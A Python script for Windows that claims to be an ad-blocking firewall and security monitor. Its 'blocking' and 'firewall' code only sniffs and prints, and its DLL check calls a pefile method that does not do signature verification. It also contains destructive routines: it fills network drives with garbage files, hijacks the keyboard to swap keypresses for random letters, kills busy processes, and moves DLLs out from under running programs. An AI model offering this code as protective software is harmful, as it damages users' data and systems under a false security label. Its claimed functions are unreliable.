import os
import subprocess
import requests
import sys
import time
import re
from scapy.all import sniff, IP, TCP, UDP, DNS, DNSQR, DNSRR, conf
import psutil
import random
import ctypes
from ctypes import wintypes
import threading
import pefile
import hashlib

# Set a custom cache directory
cache_dir = os.path.join(os.getenv("TEMP"), "scapy_cache")
os.makedirs(cache_dir, exist_ok=True)
conf.cache_dir = cache_dir
print(f"Scapy cache directory set to: {cache_dir}")

# Function to check if Npcap is installed
def is_npcap_installed():
    try:
        npcap_path = os.path.join(os.environ["SystemRoot"], "System32", "npcap")
        return os.path.exists(npcap_path)
    except Exception:
        return False

# Function to download and install Npcap
def install_npcap():
    npcap_url = "https://npcap.com/dist/npcap-oem-1.75.exe"
    npcap_installer = "npcap_installer.exe"

    print("Downloading Npcap OEM...")
    try:
        response = requests.get(npcap_url, stream=True)
        with open(npcap_installer, "wb") as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
    except Exception as e:
        print(f"Failed to download Npcap: {e}")
        return False

    print("Installing Npcap OEM...")
    try:
        command = [
            npcap_installer,
            "/S",
            "/winpcap_mode=yes",
            "/loopback_support=no",
        ]
        subprocess.run(command, check=True)
        print("Npcap installed successfully.")
        return True
    except Exception as e:
        print(f"Failed to install Npcap: {e}")
        return False
    finally:
        if os.path.exists(npcap_installer):
            os.remove(npcap_installer)

# URLs to fetch filter lists
FILTER_LIST_URLS = [
    "https://easylist.to/easylist/easylist.txt",
    "https://easylist.to/easylist/easyprivacy.txt",
    "https://raw.githubusercontent.com/uBlockOrigin/uAssets/master/filters/filters.txt",
    "https://raw.githubusercontent.com/uBlockOrigin/uAssets/master/filters/privacy.txt",
    "https://raw.githubusercontent.com/uBlockOrigin/uAssets/master/filters/annoyances.txt",
    "https://raw.githubusercontent.com/uBlockOrigin/uAssets/master/filters/badware.txt",
    "https://raw.githubusercontent.com/uBlockOrigin/uAssets/master/filters/resource-abuse.txt",
]

# Combined regex pattern to block ads
AD_REGEX_PATTERN = re.compile(
    r"^(.+[-_.])?(ad[sxv]?|teads?|doubleclick|adservice|adtrack(er|ing)?|advertising|adnxs|admeld|advert|adx(addy|pose|pr[io])?|adform|admulti|adbutler|adblade|adroll|adgr[ao]|adinterax|admarvel|admed(ia|ix)|adperium|adplugg|adserver|adsolut|adtegr(it|ity)|adtraxx|advertising|aff(iliat(es?|ion))|akamaihd|amazon-adsystem|appnexus|appsflyer|audience2media|bingads|bidswitch|brightcove|casalemedia|contextweb|criteo|doubleclick|emxdgt|e-planning|exelator|eyewonder|flashtalking|goog(le(syndication|tagservices))|gunggo|hurra(h|ynet)|imrworldwide|insightexpressai|kontera|lifestreetmedia|lkntracker|mediaplex|ooyala|openx|pixel(e|junky)|popcash|propellerads|pubmatic|quantserve|revcontent|revenuehits|sharethrough|skimresources|taboola|traktrafficx|twitter[.]com|undertone|yieldmo)",
    re.IGNORECASE
)

# YouTube-specific rules
YOUTUBE_FILTERS = [
    "||googlevideo.com^$domain=youtube.com",
    "||youtube.com/get_video_info",
    "||youtube.com/ptracking",
    "||youtube.com/pagead/",
    "||youtube.com/api/stats/ads",
    "||youtube.com/gen_204?adformat=",
    "||youtube.com/sw.js",
    "||youtube.com/s/player/*/player_ias.vflset/*",
    "||youtube.com/s/player/*/base.js",
    "||youtube.com/s/player/*/embed.js",
]

# Global list of blocked domains
blocked_domains = set()

def load_filter_lists():
    global blocked_domains
    for url in FILTER_LIST_URLS:
        try:
            response = requests.get(url)
            for line in response.text.splitlines():
                if line and not line.startswith(("!", "#", "@")):
                    blocked_domains.add(line.strip())
        except Exception as e:
            print(f"Error loading filter list {url}: {e}")

def is_ad_domain(domain):
    if AD_REGEX_PATTERN.search(domain):
        return True
    for rule in YOUTUBE_FILTERS:
        if re.match(rule.replace("*", ".*"), domain):
            return True
    if domain in blocked_domains:
        return True
    return False

def packet_callback(packet):
    if IP in packet:
        if DNS in packet and DNSQR in packet:
            domain = packet[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".")
            if is_ad_domain(domain):
                print(f"Blocked DNS query for ad domain: {domain}")
                return
        if TCP in packet and packet[TCP].dport in [80, 443]:
            host = packet[IP].dst
            if is_ad_domain(host):
                print(f"Blocked HTTP/HTTPS request to ad domain: {host}")
                return

def run_packet_filter():
    print("Starting packet filtering...")
    sniff(prn=packet_callback, store=False)

# Firewall rules
def firewall_rules():
    print("Starting firewall rules...")

    def deny_incoming_except_dhcp(packet):
        if packet.haslayer(IP):
            ip_layer = packet.getlayer(IP)
            if packet.haslayer(UDP) and packet.getlayer(UDP).dport == 67:
                print(f"Allowing DHCP packet: {ip_layer.src} -> {ip_layer.dst}")
                return
            print(f"Blocking incoming packet: {ip_layer.src} -> {ip_layer.dst}")
            return "Block"

    def deny_outgoing_not_console_logon(packet):
        if packet.haslayer(IP):
            ip_layer = packet.getlayer(IP)
            print(f"Checking outgoing packet: {ip_layer.src} -> {ip_layer.dst}")
            return "Block"

    sniff(prn=lambda x: deny_incoming_except_dhcp(x) or deny_outgoing_not_console_logon(x), store=0)

# Security monitoring
def detect_suspicious_processes():
    suspicious_processes = []
    for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'ppid']):
        try:
            if proc.info['cpu_percent'] > 10 and proc.info['ppid'] not in [0, 1, 4]:
                suspicious_processes.append(proc)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return suspicious_processes

def terminate_suspicious_processes():
    for proc in detect_suspicious_processes():
        print(f"Terminating suspicious process: {proc.info['name']} (PID: {proc.info['pid']})")
        proc.terminate()

def fill_remote_drive_with_garbage(file_size_mb=100):
    incoming_connections = psutil.net_connections(kind='tcp')
    if incoming_connections:
        print("Incoming connections detected. Filling remote drives with garbage data...")
        for drive in psutil.disk_partitions():
            if drive.mountpoint.startswith('\\\\'):
                print(f"Filling drive: {drive.mountpoint}")
                counter = 1
                while True:
                    file_path = os.path.join(drive.mountpoint, f"garbage_{counter}.dat")
                    try:
                        with open(file_path, 'wb') as f:
                            f.write(os.urandom(file_size_mb * 1024 * 1024))
                        print(f"Created garbage file: {file_path}")
                        counter += 1
                    except Exception as e:
                        print(f"Drive is full or an error occurred: {e}")
                        break
    else:
        print("No incoming connections detected.")

# Key scrambler
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))

def key_scrambler():
    def low_level_keyboard_handler(nCode, wParam, lParam):
        if wParam == 0x100:  # WM_KEYDOWN
            key = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_int))[0]
            print(f"Key pressed: {key}")
            # Scramble keypress by sending a random key
            random_key = random.randint(65, 90)
            user32.keybd_event(random_key, 0, 0, 0)
            user32.keybd_event(random_key, 0, 2, 0)
            return 1  # Block the original keypress
        return user32.CallNextHookEx(None, nCode, wParam, lParam)

    hook_proc = HOOKPROC(low_level_keyboard_handler)
    hook_id = user32.SetWindowsHookExA(13, hook_proc, kernel32.GetModuleHandleW(None), 0)
    if not hook_id:
        raise ctypes.WinError()
    try:
        msg = wintypes.MSG()
        while user32.GetMessageA(ctypes.byref(msg), None, 0, 0) > 0:
            user32.TranslateMessage(ctypes.byref(msg))
            user32.DispatchMessageA(ctypes.byref(msg))
    finally:
        user32.UnhookWindowsHookEx(hook_id)

def start_key_scrambler():
    threading.Thread(target=key_scrambler, daemon=True).start()

# Function to delete unsigned DLLs
def delete_unsigned_dlls():
    quarantine_folder = os.path.join(os.environ["SystemDrive"], "Quarantine")
    if not os.path.exists(quarantine_folder):
        os.makedirs(quarantine_folder)

    for proc in psutil.process_iter(['pid', 'name']):
        try:
            for dll in proc.memory_maps():
                dll_path = dll.path
                if dll_path.endswith(".dll"):
                    try:
                        pe = pefile.PE(dll_path)
                        if not pe.verify():
                            print(f"Unsigned DLL found: {dll_path}")
                            dest = os.path.join(quarantine_folder, os.path.basename(dll_path))
                            os.rename(dll_path, dest)
                            print(f"Moved to quarantine: {dest}")
                    except pefile.PEFormatError:
                        continue
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

# Function to stop web servers
def stop_web_servers():
    allowed_directory = os.path.join(os.environ["windir"], "Setup\\Scripts")
    ports_to_monitor = [80, 8080, 443]

    for conn in psutil.net_connections(kind='inet'):
        if conn.status == 'LISTEN' and conn.laddr.port in ports_to_monitor:
            try:
                proc = psutil.Process(conn.pid)
                if not proc.exe().startswith(allowed_directory):
                    print(f"Stopping web server process: {proc.name()} (PID: {proc.pid})")
                    proc.terminate()
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass

# Main function
def main():
    if not is_npcap_installed():
        print("Npcap is not installed.")
        if install_npcap():
            print("Npcap installed successfully. Please restart the script.")
            sys.exit(0)
        else:
            print("Failed to install Npcap. Exiting.")
            sys.exit(1)
    else:
        print("Npcap is already installed.")

    load_filter_lists()

    # Start packet filtering in a separate thread
    threading.Thread(target=run_packet_filter, daemon=True).start()

    # Start firewall rules in a separate thread
    threading.Thread(target=firewall_rules, daemon=True).start()

    # Start security monitoring
    while True:
        terminate_suspicious_processes()
        start_key_scrambler()
        fill_remote_drive_with_garbage()
        delete_unsigned_dlls()
        stop_web_servers()
        time.sleep(10)

if __name__ == "__main__":
    main()